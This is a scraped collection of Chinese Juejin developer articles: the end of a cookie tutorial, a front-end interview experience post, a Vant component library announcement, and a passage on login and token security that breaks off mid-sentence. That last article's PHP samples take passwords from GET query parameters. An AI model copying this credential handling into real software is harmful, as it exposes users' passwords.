data-src=\"https://user-gold-cdn.xitu.io/2017/10/2/ac1f0d4e46b21da20d76b8136dd7583f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>setCookie</figcaption></figure><p></p>\n<p>服务端就是通过setCookie来设置cookie的，注意点，要设置多个cookie时，得多写几个setCookie，我们还可以从上图看到，请求可以携带cookie给后端。</p>\n<h2 id=\"-\" data-id=\"heading-14\">总结</h2>\n<p>cookie讲了这么多，自己也收获了很多，也希望分享给大家，或许写的不够好，请见谅，如果觉得我写的好的朋友，给个star，<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Flaihuamin%2FJS-total\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github地址</a></p>\n</div>"},{"title":"2017秋招前端工程师百度阿里网易腾讯(全offer)面经|掘金技术征文","avatar":"https://user-gold-cdn.xitu.io/2017/9/29/9b49ca1c346114e3c89197b2d94e4919?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"LucasTwilight","create_time":"2017 年 09 月 29 日","tags":["掘金技术征文","阿里巴巴","腾讯","百度","面试"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p><em>2017.09.29更新</em><br>百度面完三面收到sp offer，百度地图部门，base北京<br>阿里被调岗到阿里音乐，已收到意向，base杭州，这个比较运气。。<br>腾讯给的意向是IEG的运营开发，所以偏后台一些，base深圳<br>网易云音乐收到sp offer，base杭州<br>补完了百度三面的所有面经，正式结束秋招吧。</p>\n<p>总结一下，现在互联网公司对于前端的要求提高了很多，已经不满足于招聘一个只会写页面的前端，由于一些MV*框架在前端大行其道，并且很多后端的业务逻辑也在逐步往前端迁移，所以前端在面试的时候，会涉及到很多除了基础之外的东西。</p>\n<ol>\n<li>框架源码，这个是现在所有大厂都很看重的一点，比较深入地阅读源码表示你对于框架的了解程度已经不仅仅是使用，阅读源码可以很好地提升自己的代码规范性，并且在进行其他框架开发的时候很有借鉴意义。</li>\n<li>算法，有些面试中会提出一些常用的算法问题，所以对于一些基本的算法的思路要有一定的了解。</li>\n<li>后台，现在前端已经偏全栈方向了，可以看到下面的面经中很多的问题都涉及到了后台的相关知识，如果会一种或者多种后台语言的话对于面试和工作都很有帮助。</li>\n<li>基础，前端需要了解的计算机基础主要在网络方面，所以认真看下HTTP和TCP/IP也是很重要的。</li>\n</ol>\n<p><em>本文更新于2017.09.06</em><br>补充一下之前的百度面经，虽然只有一面。。<br>昨天收到了猪场的offer和IEG的意向，把之前的面试经历总结一下回馈下牛客。搜狐、拼多多和华为就不贴了。</p>\n<p>985渣硕，实验室不让实习，所以也没有实习经历。</p>\n<h2 id=\"-\" data-id=\"heading-0\">百度</h2>\n<h3 id=\"-\" data-id=\"heading-1\">一面</h3>\n<p>百度的面试挺基础的：</p>\n<ol>\n<li>首先让写一个对象来满足A == '1'，然后问==和===的区别。</li>\n<li>HTTP协议缓存的实现和缓存相关的报文首部。以及HTTP的状态码。</li>\n<li>手写一个JSONP的实现。</li>\n<li>含有定时器的代码的执行顺序。这个搞懂了JavaScript内部定时器和事件队列的原理就没有什么问题了。</li>\n<li>轮播的实现。</li>\n<li>给出一个(010)111111，然后写代码来将这个模式的字符串转换为010-111111模式。</li>\n<li>有关this指向的一个题，让说出代码的运行结果。<br>因为有几个需要写代码的问题，所以虽然问题不多但是面试时间还是比较长的。</li>\n</ol>\n<h3 id=\"-\" data-id=\"heading-2\">二面</h3>\n<p>一面两天之后进行二面，百度前端面试的时候对于基础还是比较重视的。<br>这位面试官也是我面了这么多技术面试唯一的女程序员。。Orz</p>\n<ol>\n<li>了解JavaScript的异步吗？</li>\n<li>手写一个Ajax的Promise封装。</li>\n<li>手写一个NodeJS的<code>fs.readFile</code>方法的Promise封装。</li>\n<li>从一个文件中读取另外一个文件的名字，然后再读取另外一个文件的内容，用之前写的<code>fs.readFile</code>的Promise来进行实现，这里推荐大家用<code>catch</code>来进行<code>reject</code>的捕获，会有加分哦。</li>\n<li>JavaScript回调函数的<em>callback hell</em>如何解决。</li>\n<li>对于ES6了解多少，说一下一些常用的方法。</li>\n<li>如何对于数组进行深拷贝。</li>\n<li>如何使用ES6的generator函数来进行异步的调用，手写。</li>\n<li>CSS3了解的多吗？</li>\n<li><code>position</code>的几个属性有什么区别和使用情况。</li>\n<li>生成BFC的几种方法。<br>CSS的问题都答的不是很好。所以面试官还问我是不是不经常写CSS。。。</li>\n<li>HTTP协议中常用的报文头。</li>\n</ol>\n<h3 id=\"-\" data-id=\"heading-3\">三面</h3>\n<p>三面看起来应该是团队的leader，对于项目挖的很深。如果不是自己真正实现的项目，或者是在项目上有一些自己的创作。。很可能会被问出破绽。</p>\n<p>主要对于自己项目中遇到的几个技术难点进行深挖，会问到项目难点的解决方案和具体的实现思路，这里会问的很细，而且问题也是随着你的项目来进行挖掘的。</p>\n<p>在项目中会遇到一些团队合作上面的问题，如何解决这些问题，包括接口协调，一些模块之间的耦合是如何进行协同开发的等等。</p>\n<p>这一面结束之后就收到了意向的短信，一个没有HR面试的公司对于技术的重视程度确实应该还是蛮高的。</p>\n<h2 id=\"-\" data-id=\"heading-4\">阿里蚂蚁金服</h2>\n<h3 id=\"-\" data-id=\"heading-5\">一面</h3>\n<blockquote>\n<p>阿里是非常喜欢问源码的公司，一面的时候面试官说他对基础不感兴趣，所以讲了下下面几个模块的源码和主要流程。<br>React、React-Router、Redux、Vue的大致的实现原理，然后比较了下Vue和React的性能的优势和劣势。<br>一面很快，也就是十几分钟，最后和面试官聊了下RxJS拖了些时间。</p>\n</blockquote>\n<h3 id=\"-\" data-id=\"heading-6\">二面</h3>\n<p>二面在差不多一周之后，还是技术面，一上来也是各种框架和框架派生的一些技术的源代码和实现原理，之后问了点基础问题。</p>\n<ol>\n<li>git的一些命令，git pull和git fetch的区别。</li>\n<li>ES6中箭头运算符this指向问题。</li>\n<li>CSS中伪类选择器选择列表最后一个元素。</li>\n<li>JavaScript原型链，以及如何实现继承。</li>\n<li>对于现在的前端有什么看法，未来的发展方向是什么。</li>\n</ol>\n<p>大概问了不到30分钟。</p>\n<h3 id=\"-hr-\" data-id=\"heading-7\">三面HR：</h3>\n<ol>\n<li>阿里的HR小姐姐真的超级可爱，告诉我说她是一个懂技术的HR。QAQ。</li>\n<li>问了些项目，项目中遇到的问题，自己的缺点，项目中的问题是怎么解决的等等。</li>\n</ol>\n<p>真的是一个懂技术的HR小姐姐。。<br>说后面可能还有一轮技术面试。</p>\n<h3 id=\"-leader\" data-id=\"heading-8\">四面leader</h3>\n<ol>\n<li>HTTPS的原理</li>\n<li>端口号的作用</li>\n<li>n个元素的数组，求出一个数字最少的组合，使得这个组合的和为m，使用动态规划。</li>\n<li>一个proxy服务器上有一个很大的域名黑名单，如果快速对于通过proxy的请求进行过滤。</li>\n<li>和上面的类似，一个进阶问题，如果有一个很大的关键词黑名单，如何快速地对通过proxy的请求进行过滤。<blockquote>\n<p>最后等消息等到了现在(2017.09.06)，之前一面的面试官加了微信，说因为HC问题不一定能给offer，所以感觉没有交叉的我GG了，问了下自己存在的问题，面试官说一个面试官给了数据结构和算法一般，应该是leader的时候，最后一个问题没有答好导致的。</p>\n</blockquote>\n</li>\n</ol>\n<h3 id=\"-\" data-id=\"heading-9\">调岗阿里音乐</h3>\n<p>(2017.09.28)本来以为阿里已经没戏了，但是在已经准备签了网易两方之后，又收到了调岗到阿里音乐的消息，又进行了一次技术确认面试，问了几个不是很难的问题就让等HR联系了。</p>\n<ol>\n<li>平常使用的技术栈是什么？</li>\n<li>对于React组件嵌套造成的性能问题是怎么解决的？</li>\n<li>Redux对于React意味着什么？</li>\n<li>Redux在使用的时候，对于状态的越来越臃肿这个问题是怎么解决的？</li>\n<li>webkit内核在进行渲染的时候会出现什么样的性能问题？</li>\n<li>这些性能问题在进行编程的时候怎样规避？</li>\n</ol>\n<h2 id=\"-ieg\" data-id=\"heading-10\">腾讯IEG</h2>\n<p>腾讯IEG的面试对于前端非常不友好。也可能是部门的关系吧，最后查了下自己的简历评级是A+，能在最后被捞起来面一下也是蛮幸运的。</p>\n<h3 id=\"-\" data-id=\"heading-11\">电话一面</h3>\n<ol>\n<li>MySQL的引擎有哪几种。</li>\n<li>代理服务器的负载均衡，KeepAlive和lvs。</li>\n<li>实验室项目的负载均衡是怎么实现的。</li>\n<li>MySQL如何查出当天所有登录超过10次的用户，数据库里面存储的有登录日志，字段类型为时间戳。<br>主要聊得是实验室的项目和PHP、MySQL相关的东西。</li>\n</ol>\n<h3 id=\"-\" data-id=\"heading-12\">电话二面</h3>\n<ol>\n<li>聊项目</li>\n<li>PHP如何进行高并发请求处理</li>\n<li>包括代理，负载均衡，缓存层的实现这些问题以及Apache和Nginx的区别和PHP本身对于阻塞的处理。</li>\n<li>PHP的内存泄漏问题。</li>\n<li>最后扯到了五面里面唯一的纯前端问题：闭包。。</li>\n</ol>\n<h3 id=\"-\" data-id=\"heading-13\">现场一面：</h3>\n<p>首先做了一套本科计算机综合试卷。。。里面有操作系统、数据结构、算法、计算机网络、C、C++等各种内容的卷子。。做的我是心神荡漾。。</p>\n<p>然后面试官问你对C还是C++更熟悉一点，我支支吾吾说了C。。然后就让我写了一个C语言的字符串转INT的函数。。。</p>\n<p>然后问了如何使用PHP对于TCP请求进行格式化。</p>\n<p>之后问了很多和海量数据请求处理的算法和数据结构的题目，都是一些很经典的题目。</p>\n<p>最后做了个智力题，让用抛硬币模拟随机数1、2、3。这个还好之前看到过。。</p>\n<h3 id=\"-gm-hr-\" data-id=\"heading-14\">现场GM面 + HR面</h3>\n<p>GM和HR基本聊得差不多。。都是一些HR常问的问题，GM基本在聊人生。。也不知道是什么情况，现在也走完了面试流程，最后等通知。</p>\n<h2 id=\"-\" data-id=\"heading-15\">网易云音乐</h2>\n<p>杭州现场面试，前一天早晨起来面了华为，下午在机场做了滴滴笔试，晚上航班延误到4点多才到杭州，早晨8点起来赶赴网易，也是为了offer拼了老命。</p>\n<h3 id=\"-\" data-id=\"heading-16\">一面</h3>\n<p>一面，是一个看起来就很厉害的大佬。。也是我面试的所有的最紧张的一面。。大佬给的压力太大了。。</p>\n<p>首先让分析一个dropdown的效果，根据服务器返回的数据来更新dropdown列表的内容，如何实现，并且对于请求是否需要进行延迟操作，也就是debounce，然后手写了debounce的代码。</p>\n<p>然后一个大量图片的轮播图怎么实现和优化，说了lazy-load的具体实现，然后动画切换的实现，使用三个元素就可以实现了。两个用于动画效果，一个用于预加载图片，在进行一次移动之后，将移出视口的元素卸载然后挂载到三个元素的最后。</p>\n<p>然后还问了Vue和React源码的一些相关的东西，最后做了一个和函数调用的this对象绑定相关的题目。</p>\n<h3 id=\"-\" data-id=\"heading-17\">二面</h3>\n<p>二面总结一下就是deep into React，基本React能想到的东西都被问到了，组件更新过程，源码内部的一些实现细节包括Transaction等等，Vue更新过程和React的区别，Vue和React的设计思想有什么区别和优劣，甚至antd相关的也被问到了。。。HOC实现组件的封装，antd是如何实现组件的封装的，React-Redux的HOC的实现，connect函数的实现，感觉自己还是不够深入。</p>\n<h3 id=\"hr-\" data-id=\"heading-18\">HR面</h3>\n<p>HR面其实都是老一套了。。实习，生活，家庭各种问题。。最后面完了让我再等10分钟，然后查结果，被额外加了一面，带我去见总监的HR小姐姐真的好可爱。给小姐姐打call。</p>\n<h3 id=\"gm-\" data-id=\"heading-19\">GM面</h3>\n<p>其实就是对于思想方面的一轮面试，抛开技术和实现主要谈思想，对于前端整个技术栈以及web的技术栈的理解，随手问到了一些CSRF,XSS,浏览器线程模型这样的基础知识，想加入一个什么样的团队等等。</p>\n<p>由于最近面试的太多了，能记得的就这么多了。希望能够帮助到大家，自己也可以复习一下之前没有理解好的知识。<br><a href=\"https://link.juejin.im?target=https%3A%2F%2Fjuejin.im%2Fpost%2F59af60acf265da24701ee7da\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">附掘金征文大赛链接</a></p>\n</div>"},{"title":"Vant - 高效的 Vue 组件库，再造一个有赞移动商城也不在话下","avatar":"https://user-gold-cdn.xitu.io/2017/8/21/1ec8c479fb5754352e86bc0d6349b88b?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"有赞前端","create_time":"2017 年 09 月 27 日","tags":["前端"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p><a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fyouzan%2Fvant\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Vant ( \\ˈvænt\\ )</a> 是有赞前端团队基于有赞统一的规范实现的 Vue 组件库，提供了一整套 UI 基础组件和业务组件。通过 Vant，可以快速搭建出风格统一的页面，提升开发效率。目前已有近50个组件，这些组件被广泛使用于有赞的各个移动端业务中。我们会在此基础上不断完善，开发更多实用的组件。</p>\n<p>我们的目标是更快、更简单开发基于 Vue 的美观易用的移动站点。如果你需要开发一个移动商城，用 Vant 就再合适不过了。</p>\n<p></p><figure><img alt=\"Vant 组件预览\" class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/27/b9a13a016c739ae5299cc84a1a5a9005?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"https://user-gold-cdn.xitu.io/2017/9/27/b9a13a016c739ae5299cc84a1a5a9005?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption>Vant 组件预览</figcaption></figure><p></p>\n<h2 id=\"-\" data-id=\"heading-0\">一、特性</h2>\n<ul>\n<li>组件都是来源于有赞的微商城业务，并且经过有赞业务的检验，更靠谱</li>\n<li>完善详实的 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.youzanyun.com%2Fzanui%2Fvue%2Fcomponent%2Fquickstart\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">中文文档</a></li>\n<li>专门的设计师团队维护视觉规范，统一而优雅</li>\n<li>支持 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fbabel-plugin-import\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">babel-plugin-import</a></li>\n<li>单测覆盖率超过90%</li>\n</ul>\n<p>建议搭配 webpack，babel 使用 Vant，这样可以使用 webpack 提供的丰富插件和个性化配置。Vant 支持了 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fbabel-plugin-import\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">babel-plugin-import</a>，通过 babel 插件使用 Vant，可以优化代码体积，提高前端性能。</p>\n<p>Vant 提供了详细的文档，每个组件各个功能点都有详细的说明和代码示例。如果需要使用对应功能，直接复制文档上的代码即可。</p>\n<p>当然，这些只能让 Vant 成为一个优秀的 Vue UI 组件。那么，Vant 相比其它 Vue UI 组件库的优势在哪里？</p>\n<h2 id=\"-\" data-id=\"heading-1\">二、丰富实用的业务组件</h2>\n<p>Vant 不只是提供基础的UI组件，为了方便开发者快速构建移动商城，Vant 增加了许多移动商城内常用的业务组件。类似于<a href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.youzanyun.com%2Fzanui%2Fvue%2Fexamples%2Fcomponent%2Fsku\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">sku选择</a>，<a href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.youzanyun.com%2Fzanui%2Fvue%2Fexamples%2Fcomponent%2Fcoupon\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">优惠券选择</a>，<a href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.youzanyun.com%2Fzanui%2Fvue%2Fexamples%2Fcomponent%2Farea\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">省市县选择</a> 等。</p>\n<p>Vant 之后会不断丰富业务组件。从下面的不完整规划图可以看到，我们会把适用于不同业务场景的组件进行整理，逐渐完善成一个大的电商商城组件体系。\b罗列的大部分组件都已经在整理，近期会补充到 Vant 中。<br></p><figure><img alt=\"Vant规划\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/27/fe840461fb10eca649f6fbbb4325daf5?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>Vant规划</figcaption></figure><p></p>\n<h3 id=\"1-sku-\" data-id=\"heading-2\">1、SKU 选择组件</h3>\n<p>在商品页，选择商品规格进行购买是一个常见的业务场景。商品可以有多层级多种类sku，再考虑常见的限购、库存展示、购买留言、sku对应展示图片等功能，整个商品规格选择过程会变得很复杂。Vant 提供的 Sku 组件，通过指定数据传入后，即可满足上述所有需求。</p>\n<p>常见的购买过程中，数量选择只支持通过点按加减来更改购买数量。但是在需要大量购买的场景下，手动输入购买数量会更方便用户操作，我们将 Sku 组件的购买数量支持了用户直接输入数字。同时，在用户输入时，会根据限购数量自动判断是否可以购买，并进行购买数量调节。</p>\n<p>商品留言方面，Sku 组件提供了各种形式的商品留言支持，包括身份证、文本、电话、日期、时间、邮件。支持必填商品留言的展示与校验。<br></p><figure><img alt=\"Sku组件展示\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/27/af83fd1712ab104f6fc102779bab788a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>Sku组件展示</figcaption></figure><p></p>\n<h3 id=\"2-area-\" data-id=\"heading-3\">2、Area 省市县选择</h3>\n<p>Vant 提供了常见的省市县选择功能，将指定数据格式的省市县列表数据传入后，即可展示。Area 支持少于三列的选择方式，参数 columnsNum 可指定 Area 需要展示的列数，满足特殊场景下，只需要选择省或者省市的情况。</p>\n<p>Area 对外提供了 cancel，confirm 事件。开发者在代码中监听此事件，即可捕捉到用户的操作，并进行相应的处理。</p>\n<p></p><figure><img alt=\"Area 组件展示\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/27/42be72eca56e441e505f8fed9f1717fb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>Area 组件展示</figcaption></figure><p></p>\n<h3 id=\"3-coupon-\" data-id=\"heading-4\">3、Coupon 优惠券选择器</h3>\n<p>优惠券选择器提供了优惠券单元格和优惠券选择功能。</p>\n<p>优惠券单元格只需传入优惠券列表和当前使用的优惠券即可正确展示。使用 editable 参数可以控制优惠券单元格是否展示右侧箭头，这个可以用于提醒用户能否切换优惠券。</p>\n<p>优惠券选择模块功能较多。优惠券选择支持优惠码兑换功能，用户在填入优惠码以后，点击兑换，即会触发 exchange 事件。开发者在代码中监听此事件，可以实现自己的优惠码兑换。同时，优惠券选择列表支持优惠券可用和不可用的展示，对优惠券不同状态不同的展示，对用户更加友好。</p>\n<p>在近期，优惠券选择器会支持开发者自由替换优惠券选择列表中，每项优惠券的展示方式。<br></p><figure><img alt=\"Coupon 组件展示\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/27/9eb654ab7f9e0bec9c923b09d18311f2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>Coupon 组件展示</figcaption></figure><p></p>\n<h3 id=\"next-address\" data-id=\"heading-5\">Next: 地址选择大组件 Address</h3>\n<p>近期，我们会发布地址选择组件，完善 Vant 组件在地址管理方面的功能。<br></p><figure><img alt=\"Address 地址组件\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/27/9c39d7f10b412fdb98b725f0128c3eca?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>Address 地址组件</figcaption></figure><p></p>\n<h3 id=\"demo\" data-id=\"heading-6\">Demo</h3>\n<p>以下是一个基于 Vant 搭建的商城<br> demo，数据通过mock，生成的完整的购物流程。搭配优惠促销活动和用户管理界面，一个简单的买家商城就完成了。<br></p><figure><img alt=\"基于 Vant 快速搭建的商城 DEMO\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/27/295fbc4cd937202da04186e17af2fb71?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>基于 Vant 快速搭建的商城 DEMO</figcaption></figure><p></p>\n<h2 id=\"-\" data-id=\"heading-7\">三、展望</h2>\n<p><a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fyouzan%2Fvant\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Vant</a> 现在还有很多不足。业务组件才刚起步，不够完善，需要补充更多业务组件到 Vant 中。缺乏英文文档以及对 flow / typescript 的支持。期望得到大家的批评和建议，一起建立一个更好的 Vant。</p>\n<p>完整代码请移步 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fyouzan%2Fvant\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github</a>，使用指南请移步<a href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.youzanyun.com%2Fzanui%2Fvue%2Fcomponent%2Fquickstart\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">文档网站</a>。</p>\n<p>本文首发于<a href=\"https://link.juejin.im?target=https%3A%2F%2Ftech.youzan.com%2Fvant-vue-component%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">有赞技术博客</a>。</p>\n</div>"},null,{"title":"注册、登录和 token 的安全之道","avatar":"https://avatars.githubusercontent.com/u/20643362?v=3","author":"薛定諤","create_time":"2017 年 09 月 27 日","tags":["PHP","iOS","Android","前端","后端"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>最近想要做一个小项目，由于前后都是一个人，在登录和注册的接口上就被卡住了，因此想登录、注册、口令之间的关系，使用 PHP 实现登录注册模块，和访问口令。</p>\n<p>出于安全的考虑，首先定下三项原则：</p>\n<ol>\n<li>在传输中，不允许明文传输用户隐私数据；</li>\n<li>在本地，不允许明文保存用户隐私数据；</li>\n<li>在服务器，不允许明文保存用户隐私数据；</li>\n</ol>\n<p>在网络来说，我们知道不论 POST 请求和 GET 请求都会被抓包，在没有使用 HTTPS 的情况下，抓包我们是防不住的，如果明文传输用户隐私，那后果就不说了。</p>\n<p>本地和服务器也是如此，比如 iOS 设备，如果存储在本地，越狱之后通过设备 Finder 之类的功能，也能轻易找到我们存储在本地的用户隐私。</p>\n<blockquote>\n<p>使用 Keychain 在本地也有保存，但不在沙盒，暂且忽略。</p>\n</blockquote>\n<p>上面讲到，用户隐私数据总归可以被拿到的，如何保证被拿到之后不会被用来做坏事？</p>\n<h2 id=\"-\" data-id=\"heading-0\">加密</h2>\n<p>将用户的隐私数据加密，那么就算被拿到，也无法被拿来使用。在这里呢，我们先不谈加密，而是先纠正一个误区，有些朋友会认为 Base64 可以加密，甚至有 Base64 加密的说法。</p>\n<p>Base64 主要不是加密，它主要的用途是把二进制数据序列转化为 ASCII 字符序列，用以数据传输。二进制数据是什么呢？计算机上存储的所有数据，都是二进制数据。</p>\n<p>Base64 最常见的应用场景是 URL，因为 URL 只能是特定的一些 ASCII 字符。这时需要用到 Base64 编码，当然这也只是对二进制数据本身的编码，编码后的数据里面可能包含 <code>+/=</code> 等符号，真正放到 URL 里面时候，还需要URL-Encoding，变成 <code>%XX</code> 模式，以消除这些符号的歧义。其次就是将图片转为 Base64 的字符串。</p>\n<p><strong>因此，Base64 只是一种编码方式，而不是加密方式。</strong></p>\n<p>好了，现在回到我们的主题，先说登录和注册之间的关系，这 3 个模块需要做什么事情呢？</p>\n<ul>\n<li>注册：将用户输入的隐私数据，发送给服务器，服务器进行保存；</li>\n<li>登录：将用户输入的隐私数据，发送给服务器，服务器进行比对，确认是否有权限登录；</li>\n<li>token：确保用户在登录中；</li>\n</ul>\n<p>我们把用户输入的隐私数据再具象一些，比如账号和密码，结合我们上面提到的安全原则，那么分解开来，实际我们要做以下几件事：</p>\n<ul>\n<li>服务器-注册接口：接收客户端传来的账号和密码，将其保存在数据库中；</li>\n<li>服务器-登录接口：接收客户端传来的账号和密码，与数据库比对，完全命中则登录成功，否则登录失败；<ul>\n<li>登录成功后，生成或更新 token 和过期时间，保存在数据库， token 返回给客户端；</li>\n<li>服务器定期清除 token；</li>\n</ul>\n</li>\n<li>客户端-注册模块：向服务器注册接口发送账号和密码；</li>\n<li>客户端-登录模块：向服务器登录接口发送账号和密码；<ul>\n<li>登录成功后，保存 token 到本地；</li>\n<li>退出登录后，清除 token；</li>\n</ul>\n</li>\n<li>发送的账号和密码需要加密；</li>\n<li>数据库中需要保存的是加密后的账号和密码；</li>\n<li>请求敏感数据时，将客户端传来的 token 和服务器验证，不通过则提示客户端登录；</li>\n</ul>\n<p>上面逻辑理清楚后，相信对于大家来说并不难实现，以下是服务器注册接口做的事情：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-comment\">/*获取 get 请求传递的参数*/</span>\n$account = $_GET[<span class=\"hljs-string\">'account'</span>];\n$password = $_GET[<span class=\"hljs-string\">'password'</span>];\n\n<span class=\"hljs-comment\">/*创建数据连接*/</span>\n$db = <span class=\"hljs-keyword\">new</span> DataBase();\n\n<span class=\"hljs-comment\">/*检查用户名是否存在*/</span>\n$is_exist = $db-&gt;check_user_exist($account);\n\n<span class=\"hljs-keyword\">if</span> ($is_exist) {\n    <span class=\"hljs-keyword\">echo</span> return_value(<span class=\"hljs-number\">10001</span>, <span class=\"hljs-keyword\">false</span>);\n}\n<span class=\"hljs-keyword\">else</span> {\n    <span class=\"hljs-comment\">/*检查用户名是否添加成功*/</span>\n    $result = $db-&gt;add_user($account, $password);\n    <span class=\"hljs-keyword\">if</span> ($result) {\n        <span class=\"hljs-keyword\">echo</span> return_value(<span class=\"hljs-number\">0</span>, <span class=\"hljs-keyword\">true</span>);\n    }\n    <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-keyword\">echo</span> return_value(<span class=\"hljs-number\">20001</span>, <span class=\"hljs-keyword\">false</span>);\n    }\n}</code></pre><p>现在是服务器登录接口做的事情：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-comment\">/*获取 get 请求传递的参数*/</span>\n$account = $_GET[<span class=\"hljs-string\">'account'</span>];\n$password = $_GET[<span class=\"hljs-string\">'password'</span>];\n\n<span class=\"hljs-comment\">/*创建数据连接*/</span>\n$db = <span class=\"hljs-keyword\">new</span> DataBase();\n\n<span class=\"hljs-comment\">/*是否命中用户名和密码*/</span>\n$should_login = $db-&gt;should_login($account, $password);\n\n<span class=\"hljs-keyword\">if</span> ($should_login) {\n    <span class=\"hljs-comment\">/*更新 token*/</span>\n    $token = $db-&gt;insert_token($account);\n    <span class=\"hljs-keyword\">if</span> ($token == <span class=\"hljs-string\">''</span>) {\n        <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">40001</span>, <span class=\"hljs-keyword\">false</span>);\n    }\n    <span class=\"hljs-keyword\">else</span> {\n        $data = [<span class=\"hljs-string\">'token'</span> =&gt; $token];\n        <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">0</span>, $data);\n    }\n}\n<span class=\"hljs-keyword\">else</span> {\n    <span class=\"hljs-keyword\">echo</span> response(<span class=\"hljs-number\">30001</span>, <span class=\"hljs-keyword\">false</span>);\n}</code></pre><p>剩下的无非是加密算法的不同，我最常用的是 md5，那么我们经过 md5 加密以后，其实还是不太安全，为什么呢？因为 md5 本身就不安全。虽然 md5 是不可逆的 hash 算法，反向算出来虽然困难，但是如果反向查询，密码设置的简单，也很容易被攻破。</p>\n<p>比如我们使用 md5 加密一个密码 <code>123456</code>，对应的 md5 是 <code>e10adc3949ba59abbe56e057f20f883e</code>，找到一个 md5 解密的网站，比如 <a 